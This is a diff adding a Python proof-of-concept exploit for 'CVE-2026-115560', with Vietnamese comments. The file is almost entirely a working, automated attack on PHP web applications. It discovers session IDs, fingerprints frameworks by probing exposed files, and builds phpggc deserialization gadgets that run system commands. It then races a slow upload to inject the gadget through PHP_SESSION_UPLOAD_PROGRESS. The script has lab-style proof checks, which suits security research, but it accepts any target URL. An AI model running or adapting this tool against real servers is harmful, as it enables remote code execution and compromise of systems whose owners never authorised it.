@@ -1,0 +1,731 @@
+#!/usr/bin/env python3
+"""
+CVE-2026-115560 - automated, no-hardcode build.
+Stages: 1 (SID discovery) → 2 (upload_progress) → 3 (fingerprint) →
+        4 (gadget via phpggc) → 5 (writer serializer) → 6 (race) →
+        7 (proof) → 8 (report).
+
+Triết lý: nếu thiếu dữ kiện → exit code rõ ràng, KHÔNG đoán.
+"""
+import argparse
+import json
+import os
+import re
+import shutil
+import socket
+import ssl
+import subprocess
+import sys
+import threading
+import time
+from urllib.parse import quote, urlparse
+
+# -------------------- config (không hardcode target) --------------------
+BOUNDARY = "----pwnd"
+CHUNK_SIZE = 600
+DRIP_INTERVAL = 1.15
+HEAD_START = 8
+POLL_INTERVAL = 1
+PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"
+
+# Proof cụ thể: chỉ match khi gadget thực thi (không grep source)
+LAB_PROOF_PATTERN = re.compile(rb"SERIALIZED_(?:WAKEUP|DESTRUCT)")
+
+# Session path mặc định — CHỈ là gợi ý, có thể override bằng --session-path
+DEFAULT_SESSION_PATHS = [
+    "/var/lib/php/sessions/sess_{sid}",   # Debian/Ubuntu (plural)
+    "/var/lib/php/session/sess_{sid}",    # Fedora/RHEL (singular)
+    "/tmp/sess_{sid}",
+]
+
+# Endpoint thường dùng để reflect session (Stage 5)
+REFLECTION_ENDPOINTS = ["/me", "/api/user", "/profile", "/debug",
+                        "/phpinfo.php", "/status", "/whoami", "/.well-known/me"]
+
+# Path fingerprint (Stage 3)
+FP_PATHS = ["/wp-login.php", "/composer.json",
+            "/vendor/composer/installed.json", "/.git/HEAD",
+            "/server-status", "/CHANGELOG.md", "/artisan"]
+
+# Header fingerprint
+FP_HEADERS = {
+    "x-powered-by": None,
+    "server": None,
+    "set-cookie": None,
+    "x-frame-options": None,
+}
+
+FRAMEWORK_COOKIES = {
+    "laravel_session": "Laravel",
+    "symfony": "Symfony",
+    "sf_": "Symfony",
+    "wordpress_": "WordPress",
+    "wp-settings-": "WordPress",
+    "JSESSIONID": "Java",
+    "connect.sid": "Node",
+    "PHPSESSID": "plain-php",
+    "drupal": "Drupal",
+    "joomla": "Joomla",
+}
+
+
+# -------------------- HTTP --------------------
+def make_ssl_context():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+
+def parse_url(url):
+    if "://" not in url:
+        url = "http://" + url
+    p = urlparse(url)
+    if not p.hostname:
+        raise ValueError(f"invalid URL: {url}")
+    port = p.port or (443 if p.scheme == "https" else 80)
+    path = p.path or "/"
+    if p.query:
+        path += "?" + p.query
+    return p.hostname, port, path
+
+
+def dechunk(data):
+    out = b""
+    while data:
+        line, sep, rem = data.partition(b"\r\n")
+        if not sep:
+            return data
+        try:
+            size = int(line.split(b";", 1)[0], 16)
+        except ValueError:
+            return data
+        if size == 0:
+            return out
+        if len(rem) < size + 2:
+            return data
+        out += rem[:size]
+        data = rem[size + 2:]
+    return out
+
+
+def http_request(url, method="GET", headers=None, body=b"", timeout=20,
+                 follow_redirects=0):
+    host, port, path = parse_url(url)
+    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
+    for k, v in (headers or {}).items():
+        lines.append(f"{k}: {v}")
+    if body:
+        lines.append(f"Content-Length: {len(body)}")
+    req = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
+    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw.settimeout(timeout)
+    sock = make_ssl_context().wrap_socket(raw, server_hostname=host) if port == 443 else raw
+    try:
+        sock.connect((host, port))
+        sock.sendall(req)
+        resp = b""
+        while True:
+            chunk = sock.recv(65536)
+            if not chunk:
+                break
+            resp += chunk
+    finally:
+        sock.close()
+    head, _, rawbody = resp.partition(b"\r\n\r\n")
+    status = head.split(b"\r\n", 1)[0].decode(errors="replace") if head else ""
+    body_out = dechunk(rawbody)
+
+    # follow redirect đơn giản (dùng cho Stage 1 discover cookie sau 302)
+    if follow_redirects > 0 and "30" in status:
+        m = re.search(rb"(?i)location:\s*(\S+)", head)
+        if m:
+            loc = m.group(1).decode(errors="replace")
+            if loc.startswith("/"):
+                loc = f"{'https' if port == 443 else 'http'}://{host}{loc}"
+            return http_request(loc, method="GET", headers=headers,
+                                body=b"", timeout=timeout,
+                                follow_redirects=follow_redirects - 1)
+    return status, head, body_out
+
+
+def http_get(url):
+    _, _, body = http_request(url)
+    return "200", body
+
+
+# -------------------- Stage 1: SID propagation discovery --------------------
+def _parse_set_cookies(raw_headers):
+    out = []
+    for line in raw_headers.split(b"\r\n"):
+        m = re.match(rb"(?i)set-cookie:\s*([^=\s;]+)=([^;\s]*)", line)
+        if m:
+            out.append((m.group(1).decode(), m.group(2).decode()))
+    return out
+
+
+def discover_session(base_url, paths=None, probe_path="/login"):
+    """
+    Stage 1 — đầy đủ 6 bước, không hardcode PHPSESSID.
+    Trả về dict: name, sid, accepts_supplied, honors_post_body, rotates, evidence.
+    """
+    paths = paths or ["/", "/index.php", "/login", "/profile"]
+    ev = {}
+
+    # (1) discover name + SID
+    name = sid = None
+    for p in paths:
+        url = base_url.rstrip("/") + (p if p != "/" else "/")
+        try:
+            status, headers, _ = http_request(url, follow_redirects=2)
+        except OSError as exc:
+            ev[p] = f"request failed: {exc}"
+            continue
+        cookies = _parse_set_cookies(headers)
+        ev[p] = f"{status}; cookies={cookies!r}"
+        if cookies and name is None:
+            name, sid = cookies[0]
+    if not name:
+        return {"name": None, "sid": None, "accepts_supplied": None,
+                "honors_post_body": None, "rotates": None,
+                "evidence": ev, "fatal": "NO_SESSION"}
+
+    # (2) strict mode: gửi 'a'*26, xem server có mint SID mới không
+    test_sid = "a" * 26
+    try:
+        _, headers, _ = http_request(base_url.rstrip("/") + "/",
+                                     headers={"Cookie": f"{name}={test_sid}"})
+        echoed = _parse_set_cookies(headers)
+        accepts = bool(echoed) and echoed[0][1] == test_sid
+        ev["strict_mode"] = f"echoed={echoed!r} accepts={accepts}"
+    except OSError as exc:
+        accepts = None
+        ev["strict_mode"] = f"failed: {exc}"
+
+    # (3) only_cookies: POST form-field <name> không kèm Cookie
+    body = (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
+        f"{test_sid}\r\n"
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+        f"x\r\n"
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="f"; filename="f"\r\n\r\n'
+        f"y\r\n--{BOUNDARY}--\r\n"
+    ).encode()
+    try:
+        _, headers, _ = http_request(
+            base_url.rstrip("/") + "/", method="POST",
+            headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
+            body=body)
+        echoed = _parse_set_cookies(headers)
+        honors_post = bool(echoed) and echoed[0][1] == test_sid
+        ev["only_cookies"] = f"echoed={echoed!r} honors={honors_post}"
+    except OSError as exc:
+        honors_post = None
+        ev["only_cookies"] = f"failed: {exc}"
+
+    # (4) rotation: giữ nguyên SID qua 2 request
+    rotates = None
+    try:
+        _, h1, _ = http_request(base_url.rstrip("/") + "/",
+                                headers={"Cookie": f"{name}={sid}"})
+        _, h2, _ = http_request(base_url.rstrip("/") + "/",
+                                headers={"Cookie": f"{name}={sid}"})
+        c1, c2 = _parse_set_cookies(h1), _parse_set_cookies(h2)
+        if c1 and c2:
+            rotates = c1[0][1] != c2[0][1]
+            ev["rotation"] = f"sids={c1[0][1]!r},{c2[0][1]!r} rotates={rotates}"
+    except OSError as exc:
+        ev["rotation"] = f"failed: {exc}"
+
+    # (5) cross-endpoint rotation (login / logout)
+    try:
+        _, h1, _ = http_request(base_url.rstrip("/") + "/")
+        _, h2, _ = http_request(base_url.rstrip("/") + probe_path)
+        c1, c2 = _parse_set_cookies(h1), _parse_set_cookies(h2)
+        if c1 and c2:
+            ev["cross_endpoint"] = (f"{c1[0][1]!r} vs {c2[0][1]!r} "
+                                    f"rotates={c1[0][1] != c2[0][1]}")
+    except OSError as exc:
+        ev["cross_endpoint"] = f"failed: {exc}"
+
+    # (6) chọn SID dùng cho exploit
+    # Nếu honors_post_body → dùng POST form; ngược lại gửi Cookie.
+    return {"name": name, "sid": sid, "accepts_supplied": accepts,
+            "honors_post_body": honors_post, "rotates": rotates,
+            "evidence": ev, "fatal": None}
+
+
+# -------------------- Stage 2: upload progress --------------------
+def probe_upload_progress(base_url, strategy):
+    """Trả về enabled/disabled nếu có reflection endpoint; UNKNOWN nếu không."""
+    for ep in REFLECTION_ENDPOINTS:
+        try:
+            status, _, body = http_request(base_url.rstrip("/") + ep, timeout=8)
+        except OSError:
+            continue
+        if "200" not in status or not body:
+            continue
+        if b"upload_progress" in body or b"PHP_SESSION_UPLOAD_PROGRESS" in body:
+            return {"upload_progress": "ENABLED",
+                    "evidence": f"reflection at {ep}"}
+    return {"upload_progress": "UNKNOWN",
+            "reason": "no reflection endpoint; cannot confirm enabled"}
+
+
+# -------------------- Stage 3: fingerprint --------------------
+def fingerprint_framework(base_url, session_name):
+    fw = None
+    for prefix, label in FRAMEWORK_COOKIES.items():
+        if session_name and (session_name == prefix or session_name.startswith(prefix)):
+            fw = label
+            break
+
+    leaks = []
+    # cookie name -> framework
+    if session_name == "PHPSESSID":
+        fw = fw or "plain-php"
+
+    # path heuristics
+    for p in FP_PATHS:
+        try:
+            status, headers, body = http_request(base_url.rstrip("/") + p, timeout=8)
+        except OSError:
+            continue
+        if "200" in status and len(body) < 8192:
+            leaks.append({"path": p, "status": status,
+                          "snippet": body[:200].decode(errors="replace")})
+            if p == "/composer.json":
+                try:
+                    j = json.loads(body)
+                    if "require" in j:
+                        fw = fw or "composer"
+                except Exception:
+                    pass
+            if p == "/artisan":
+                fw = fw or "Laravel"
+            if p == "/wp-login.php":
+                fw = fw or "WordPress"
+
+    confidence = "low" if fw else "unknown"
+    if leaks:
+        confidence = "medium"
+    return {"framework": fw or "unknown",
+            "confidence": confidence, "leaks": leaks}
+
+
+# -------------------- Stage 4: gadget discovery qua phpggc --------------------
+def _phpggc_available():
+    return shutil.which("phpggc") is not None
+
+
+def enumerate_gadgets(framework, version=None):
+    """
+    Trả về list các chain phpggc khả dụng cho framework.
+    Không tự build gadget — chỉ liệt kê + gợi ý.
+    """
+    if not _phpggc_available():
+        return {"available": False,
+                "reason": "phpggc not in PATH; install or use --gadget"}
+    try:
+        out = subprocess.run(["phpggc", "-l"], capture_output=True,
+                             text=True, timeout=20)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        return {"available": False, "reason": f"phpggc failed: {exc}"}
+    chains = []
+    for line in out.stdout.splitlines():
+        if not line.strip():
+            continue
+        # format: "Monolog/RCE1  ..." — chỉ match framework nếu có
+        if framework and framework.lower() not in line.lower():
+            continue
+        chains.append(line.strip())
+    return {"available": True, "chains": chains[:50],
+            "framework": framework}
+
+
+def build_gadget_from_chain(chain, cmd="id"):
+    """Gọi phpggc <chain> system '<cmd>' → serialized bytes."""
+    if not _phpggc_available():
+        raise RuntimeError("phpggc not available")
+    try:
+        out = subprocess.run(["phpggc", chain, "system", cmd],
+                             capture_output=True, timeout=30)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        raise RuntimeError(f"phpggc {chain} failed: {exc}")
+    if out.returncode != 0:
+        raise RuntimeError(f"phpggc {chain} rc={out.returncode}: "
+                           f"{out.stderr.decode(errors='replace')[:300]}")
+    return out.stdout
+
+
+# -------------------- Stage 5: writer serializer --------------------
+def detect_writer_serializer(base_url, strategy, gadget_override=None):
+    # reflection
+    for ep in REFLECTION_ENDPOINTS:
+        try:
+            status, _, body = http_request(base_url.rstrip("/") + ep, timeout=6)
+        except OSError:
+            continue
+        if "200" not in status or not body:
+            continue
+        if body.startswith(b"a:") and b"{s:" in body:
+            return {"serializer": "php_serialize", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+        if body and body[0] < 0x20 and len(body) > 1 and 0x20 <= body[1] < 0x7f:
+            return {"serializer": "php_binary", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+        if b"|" in body and not body.startswith(b"a:"):
+            return {"serializer": "php", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+    # heuristic
+    if gadget_override:
+        real = _post_probe(base_url, strategy, b"x|" + gadget_override.encode())
+        fake = _post_probe(base_url, strategy,
+                           b'x|0:32:"RandomNonexistentClass1234567890":0:{}')
+        if real is not None and fake is not None and real != fake:
+            return {"serializer": "unknown", "confidence": "low",
+                    "evidence": "behavior differs real vs fake gadget"}
+    return {"serializer": "unknown", "confidence": "unknown",
+            "evidence": "no reflection; heuristic inconclusive"}
+
+
+def _post_probe(base_url, strategy, payload_value):
+    body = (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+        + payload_value.decode(errors="replace") +
+        f"\r\n--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="f"; filename="f"\r\n\r\n'
+        f"y\r\n--{BOUNDARY}--\r\n"
+    ).encode()
+    headers = {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"}
+    if strategy.get("accepts_supplied") and strategy.get("name") and strategy.get("sid"):
+        headers["Cookie"] = f"{strategy['name']}={strategy['sid']}"
+    try:
+        _, _, body = http_request(base_url.rstrip("/") + "/", method="POST",
+                                  headers=headers, body=body, timeout=10)
+        return body
+    except OSError:
+        return None
+
+
+# -------------------- Stage 6: race --------------------
+def _payload_for_writer(serializer, gadget_bytes):
+    if serializer == "php_binary":
+        return ("x|" + gadget_bytes).encode()
+    if serializer == "php_serialize":
+        return ("|" + gadget_bytes).encode()
+    return None
+
+
+def slow_upload(host, port, path, duration, stop, progress_value, filename,
+                field_name, strategy, stats):
+    prefix = (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+        f"{progress_value}\r\n"
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
+        "\r\n"
+    ).encode()
+    suffix = f"\r\n--{BOUNDARY}--\r\n".encode()
+    content_length = len(prefix) + CHUNK_SIZE * duration + len(suffix)
+    header_lines = [
+        f"POST {path} HTTP/1.1", f"Host: {host}",
+        f"Content-Type: multipart/form-data; boundary={BOUNDARY}",
+        f"Content-Length: {content_length}", "Connection: close",
+    ]
+    # SID đi qua Cookie hoặc POST-body tùy strategy
+    if not strategy.get("honors_post_body") and strategy.get("name") and strategy.get("sid"):
+        header_lines.insert(2, f"Cookie: {strategy['name']}={strategy['sid']}")
+    # Nếu honors_post_body, SID phải là form field (thêm vào prefix)
+    if strategy.get("honors_post_body") and strategy.get("name") and strategy.get("sid"):
+        sid_field = (
+            f"--{BOUNDARY}\r\n"
+            f'Content-Disposition: form-data; name="{strategy["name"]}"\r\n\r\n'
+            f"{strategy['sid']}\r\n"
+        ).encode()
+        prefix = sid_field + prefix
+        content_length = len(prefix) + CHUNK_SIZE * duration + len(suffix)
+        header_lines[3] = f"Content-Length: {content_length}"
+
+    request = ("\r\n".join(header_lines) + "\r\n\r\n").encode()
+    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw.settimeout(10)
+    sock = make_ssl_context().wrap_socket(raw, server_hostname=host) if port == 443 else raw
+    stats["upload_start"] = time.time()
+    try:
+        sock.connect((host, port))
+        sock.sendall(request)
+        sock.sendall(prefix)
+        stats["producer_bytes"] = len(request) + len(prefix)
+        for i in range(duration):
+            if stop.is_set():
+                stats["upload_stopped"] = "proof captured"
+                return
+            try:
+                sock.sendall(b" " * CHUNK_SIZE)
+                stats["producer_bytes"] += CHUNK_SIZE
+            except OSError as exc:
+                stats["upload_error"] = str(exc)
+                return
+            if stop.wait(DRIP_INTERVAL):
+                stats["upload_stopped"] = "proof captured"
+                return
+        sock.sendall(suffix)
+        stats["upload_finished"] = time.time()
+    except OSError as exc:
+        stats["upload_error"] = str(exc)
+    finally:
+        sock.close()
+
+
+def race(target_url, strategy, serializer, gadget_bytes, duration, control_url=None):
+    if not strategy.get("name") or not strategy.get("sid"):
+        return {"status": "SID_STRATEGY_MISMATCH",
+                "reason": "session name/sid not discovered"}
+    payload = _payload_for_writer(serializer, gadget_bytes)
+    if payload is None:
+        return {"status": "NOT_VULNERABLE",
+                "reason": f"writer serializer={serializer} (no mismatch possible)"}
+
+    stop_event = threading.Event()
+    proof_event = threading.Event()
+    stats = {}
+
+    host, port, path = parse_url(target_url)
+    t = threading.Thread(target=slow_upload,
+                         args=(host, port, path, duration, proof_event,
+                               payload.decode(), "f", "f", strategy, stats),
+                         daemon=True)
+    t.start()
+    time.sleep(HEAD_START)
+    hits = 0
+    first_proof = None
+    while t.is_alive() and not proof_event.is_set():
+        try:
+            _, _, body = http_request(target_url, timeout=10)
+            hits += 1
+            m = LAB_PROOF_PATTERN.search(body)
+            if m:
+                first_proof = m.group().decode()
+                proof_event.set()
+                stop_event.set()
+                break
+        except OSError:
+            pass
+        time.sleep(POLL_INTERVAL)
+    proof_event.set()
+    t.join(timeout=5)
+    stats["consumer_hits"] = hits
+    stats["first_proof"] = first_proof
+
+    if not first_proof:
+        return {"status": "NO_PROOF", "stats": stats}
+
+    if control_url:
+        if _control_check(control_url, strategy, serializer, gadget_bytes, duration):
+            return {"status": "DETECTOR_BROKEN",
+                    "reason": "control URL also produced proof", "stats": stats}
+    return {"status": "SUCCESS", "proof": first_proof, "stats": stats}
+
+
+def _control_check(control_url, strategy, serializer, gadget_bytes, duration):
+    payload = _payload_for_writer(serializer, gadget_bytes)
+    if payload is None:
+        return False
+    stop_event = threading.Event()
+    proof_event = threading.Event()
+    stats = {}
+    host, port, path = parse_url(control_url)
+    t = threading.Thread(target=slow_upload,
+                         args=(host, port, path, duration, proof_event,
+                               payload.decode(), "f", "f", strategy, stats),
+                         daemon=True)
+    t.start()
+    time.sleep(HEAD_START)
+    fired = False
+    while t.is_alive() and not proof_event.is_set():
+        try:
+            _, _, body = http_request(control_url, timeout=10)
+            if LAB_PROOF_PATTERN.search(body):
+                fired = True
+                proof_event.set()
+                stop_event.set()
+                break
+        except OSError:
+            pass
+        time.sleep(POLL_INTERVAL)
+    proof_event.set()
+    t.join(timeout=5)
+    return fired
+
+
+# -------------------- Stage 8: report --------------------
+def print_precondition_table(result):
+    rows = [
+        ("[1] SID strategy", f"name={result.get('session_name')!r} "
+                             f"honors_post={result.get('sid_strategy',{}).get('honors_post_body')} "
+                             f"rotates={result.get('sid_strategy',{}).get('rotates')}"),
+        ("[2] upload_progress", result.get("upload_progress", "UNKNOWN")),
+        ("[3] framework", f"{result.get('framework','unknown')} "
+                          f"(confidence={result.get('framework_confidence','unknown')})"),
+        ("[4] gadget", f"{result.get('gadget_status','NO_GADGET')} "
+                       f"({result.get('gadget_source')})"),
+        ("[5] writer", f"{result.get('writer_serializer','unknown')} "
+                       f"(confidence={result.get('writer_confidence','unknown')})"),
+        ("[6] race", result.get("race_status", "not-run")),
+    ]
+    print("\n Precondition status:")
+    for label, val in rows:
+        print(f"   {label}: {val}")
+
+
+def _emit(result, as_json):
+    if as_json:
+        print(json.dumps(result, indent=2, default=str))
+
+
+# -------------------- main --------------------
+def main():
+    ap = argparse.ArgumentParser(
+        description="CVE-2026-115560 - automated PoC (no hardcode)")
+    ap.add_argument("--remote", required=True, help="target base URL")
+    ap.add_argument("--control-url", help="negative-control URL (must be clean)")
+    ap.add_argument("--paths", nargs="*", default=None,
+                    help="paths to probe for Stage 1 (default: /,/index.php,/login,/profile)")
+    ap.add_argument("--probe-path", default="/login",
+                    help="second endpoint for cross-rotation (Stage 1 step 5)")
+    ap.add_argument("--gadget", help="serialized gadget bytes (override phpggc)")
+    ap.add_argument("--gadget-chain", help="phpggc chain name, e.g. Monolog/RCE1")
+    ap.add_argument("--gadget-cmd", default="id", help="command for phpggc chain")
+    ap.add_argument("--serializer", choices=["php", "php_binary", "php_serialize", "unknown"],
+                    default=None, help="override writer serializer (Stage 5)")
+    ap.add_argument("--duration", type=int, default=45)
+    ap.add_argument("--session-path", action="append", default=None,
+                    help="template session path (dùng {sid}); có thể lặp lại")
+    ap.add_argument("--lfi-param", default=None,
+                    help="query param cho LFI, vd: file")
+    ap.add_argument("--lfi-endpoint", default=None,
+                    help="endpoint LFI, vd: /index.php")
+    ap.add_argument("--json", action="store_true", help="emit structured JSON")
+    args = ap.parse_args()
+
+    result = {"target": args.remote, "control": args.control_url}
+
+    # Stage 1
+    strategy = discover_session(args.remote, paths=args.paths,
+                                probe_path=args.probe_path)
+    result["session_name"] = strategy.get("name")
+    result["sid_strategy"] = {k: strategy.get(k) for k in
+                              ("name", "accepts_supplied", "honors_post_body", "rotates")}
+    result["sid_evidence"] = strategy.get("evidence")
+    if strategy.get("fatal") == "NO_SESSION":
+        result["failure_reason"] = "NO_SESSION: no Set-Cookie observed"
+        result["exit"] = 2
+        _emit(result, args.json)
+        return 2
+
+    # Stage 2
+    up = probe_upload_progress(args.remote, strategy)
+    result["upload_progress"] = up["upload_progress"]
+
+    # Stage 3
+    fp = fingerprint_framework(args.remote, strategy["name"])
+    result["framework"] = fp["framework"]
+    result["framework_confidence"] = fp["confidence"]
+    result["framework_leaks"] = fp["leaks"]
+
+    # Stage 4
+    if args.gadget:
+        gadget_bytes = args.gadget.encode()
+        gadget_source = "override"
+        gadget_status = "SUPPLIED"
+    elif args.gadget_chain:
+        try:
+            gadget_bytes = build_gadget_from_chain(args.gadget_chain, args.gadget_cmd)
+            gadget_source = f"phpggc:{args.gadget_chain}"
+            gadget_status = "SUPPLIED"
+        except RuntimeError as exc:
+            gadget_bytes = None
+            gadget_source = str(exc)
+            gadget_status = "BUILD_FAILED"
+    else:
+        enum = enumerate_gadgets(fp["framework"])
+        result["gadget_enum"] = enum
+        gadget_bytes = None
+        gadget_source = "phpggc-enum"
+        gadget_status = "NO_GADGET" if not enum.get("available") else "AVAILABLE_UNCHOSEN"
+
+    result["gadget_status"] = gadget_status
+    result["gadget_source"] = gadget_source
+
+    # Stage 5
+    ws = detect_writer_serializer(args.remote, strategy,
+                                  gadget_override=(gadget_bytes.decode()
+                                                   if gadget_bytes else None))
+    if args.serializer:
+        ws["serializer"] = args.serializer
+        ws["confidence"] = "override"
+    result["writer_serializer"] = ws["serializer"]
+    result["writer_confidence"] = ws["confidence"]
+    result["writer_evidence"] = ws["evidence"]
+
+    # Gate: không đoán
+    if gadget_bytes is None:
+        result["failure_reason"] = ("NO_GADGET: supply --gadget or --gadget-chain "
+                                    "(phpggc) — refusing to guess")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    serializer = ws["serializer"]
+    if serializer == "unknown":
+        if args.serializer:
+            serializer = args.serializer
+        else:
+            result["failure_reason"] = ("writer serializer unknown; "
+                                        "supply --serializer or reflection endpoint")
+            result["exit"] = 2
+            print_precondition_table(result)
+            _emit(result, args.json)
+            return 2
+    result["race_serializer_used"] = serializer
+
+    # Stage 6
+    rr = race(args.remote, strategy, serializer, gadget_bytes,
+              args.duration, args.control_url)
+    result["race_status"] = rr["status"]
+    result["race_stats"] = rr.get("stats", {})
+    if rr["status"] == "SUCCESS":
+        result["success"] = True
+        result["proof"] = rr["proof"]
+        result["exit"] = 0
+    elif rr["status"] == "DETECTOR_BROKEN":
+        result["success"] = False
+        result["failure_reason"] = rr["reason"]
+        result["exit"] = 3
+    elif rr["status"] in ("NOT_VULNERABLE", "SID_STRATEGY_MISMATCH"):
+        result["success"] = False
+        result["failure_reason"] = rr["reason"]
+        result["exit"] = 2
+    else:
+        result["success"] = False
+        result["failure_reason"] = "race ran but no proof observed"
+        result["exit"] = 1
+
+    print_precondition_table(result)
+    if result.get("success"):
+        print(f"\n [+] Proof: {result['proof']}")
+    else:
+        print(f"\n [-] {result.get('failure_reason')}")
+    _emit(result, args.json)
+    return result["exit"]
+
+
+if __name__ == "__main__":
+    sys.exit(main())
